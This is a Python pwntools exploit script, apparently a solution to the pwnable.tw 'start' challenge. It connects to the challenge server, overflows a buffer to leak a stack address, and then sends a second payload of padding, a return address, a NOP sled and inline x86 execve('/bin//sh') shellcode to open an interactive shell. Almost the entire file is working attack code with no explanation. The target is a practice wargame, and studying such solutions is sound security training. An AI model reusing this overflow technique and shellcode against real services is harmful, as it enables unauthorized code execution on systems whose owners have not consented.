#!/usr/bin/env python
# -*- encoding: utf-8 -*-
__author__ = 'Albertchang'
from pwn import *
from ctypes import *
from hexdump import hexdump
import os, sys

# switches
DEBUG = 1
LOCAL = 0
VERBOSE = 1
# modify this
if LOCAL:
    io = process('./start')
else:
    #io = remote('10.211.55.7',6666)
    io = remote("chall.pwnable.tw",10000)

if VERBOSE:
    context(log_level='debug')

def ru(delim):
    return io.recvuntil(delim)

def rn(count):
    return io.recvn(count)

def ra(count):      # recv all
    buf = ''
    while count:
        tmp = io.recvn(count)
        buf += tmp
        count -= len(tmp)
    return buf

def sl(data):
    return io.sendline(data)

def sn(data):
    return io.send(data)

def info(string):
    return log.info(string)

def dehex(s):
    return s.replace(' ','').decode('hex')

def limu8(x):
    return c_uint8(x).value

def limu16(x):
    return c_uint16(x).value

def limu32(x):
    return c_uint32(x).value

# define interactive functions here

if __name__ == '__main__':
    ret_addr = 0x8048087
    shellcode = "\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
    padding = "A"*20
    ru(':')
    payload1 = padding + p32(ret_addr)
    sn(payload1)
    leak = u32(rn(4))
    log.success("leak esp_addr : %s",hex(leak))
    log.success("jmp2addr : %s",hex(leak+0x0a+0x8))
    payload2 = 'A'*20 + p32(leak + 0x18) + "\x90" * 8 + shellcode
    sn(payload2)
    io.interactive()

